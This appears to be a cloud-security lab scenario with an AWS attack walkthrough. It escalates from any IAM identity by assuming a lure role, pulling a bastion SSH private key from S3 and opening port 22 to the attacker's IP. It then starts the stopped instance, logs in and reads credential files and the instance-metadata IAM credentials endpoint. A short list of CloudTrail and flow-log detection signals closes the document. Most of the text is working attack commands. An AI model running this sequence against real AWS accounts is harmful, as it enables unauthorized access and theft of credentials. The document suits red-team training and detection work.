# Scenario 4 — Abuse Steps: S3 SSH Key → EC2 Bastion with Sensitive Files

## Prerequisites
- AWS CLI configured with any IAM identity in the target account
- Account ID known
- SSH client available

## Step-by-Step

```bash
# 1. Discover and assume the lure role
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)

CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::${ACCOUNT_ID}:role/devops-s3-deploy-role" \
  --role-session-name "recon-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)

# 2. List buckets — find the deploy keys bucket
aws s3 ls

# 3. Download the SSH private key
aws s3 cp s3://devops-deploy-keys-${ACCOUNT_ID}/keys/prod-bastion-keypair.pem ./prod-bastion-keypair.pem
chmod 600 ./prod-bastion-keypair.pem

# 4. Find the bastion instance
aws ec2 describe-instances \
  --filters "Name=tag:Name,Values=prod-bastion-host" \
  --query "Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,SecurityGroups[0].GroupId]" \
  --output table

# Note the instance ID, state (stopped), and security group ID
INSTANCE_ID="<instance-id-from-above>"
SG_ID="<security-group-id-from-above>"

# 5. Check current security group rules
aws ec2 describe-security-groups --group-ids ${SG_ID} \
  --query "SecurityGroups[0].IpPermissions" --output json

# 6. Add your own IP to the security group (DETECTION SIGNAL)
MY_IP=$(curl -s https://checkip.amazonaws.com)/32
aws ec2 authorize-security-group-ingress \
  --group-id ${SG_ID} \
  --protocol tcp \
  --port 22 \
  --cidr ${MY_IP}

# 7. Start the stopped instance (DETECTION SIGNAL)
aws ec2 start-instances --instance-ids ${INSTANCE_ID}
aws ec2 wait instance-running --instance-ids ${INSTANCE_ID}

# 8. Get the public IP
BASTION_IP=$(aws ec2 describe-instances \
  --instance-ids ${INSTANCE_ID} \
  --query "Reservations[0].Instances[0].PublicIpAddress" \
  --output text)

# 9. SSH into the bastion
ssh -i ./prod-bastion-keypair.pem ec2-user@${BASTION_IP}

# --- On the bastion instance ---

# 10. Find sensitive files
cat /home/ec2-user/.env
cat /home/ec2-user/config/db-backup-creds.json
cat /home/ec2-user/.ssh/internal-hosts.conf
sudo cat /root/.aws/credentials

# 11. Check for instance profile (leads to scenario-5 if deployed)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 12. Exit and clean up session
exit
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

## Detection Signals
- CloudTrail: `AssumeRole` on `devops-s3-deploy-role`
- CloudTrail: `ListBuckets`, `GetObject` on deploy keys bucket
- CloudTrail: `DescribeInstances`, `DescribeSecurityGroups`
- CloudTrail: `AuthorizeSecurityGroupIngress` — attacker adds their IP
- CloudTrail: `StartInstances` — attacker starts the stopped instance
- VPC Flow Logs: SSH connection to bastion IP
- Any attempted use of credentials found on the instance
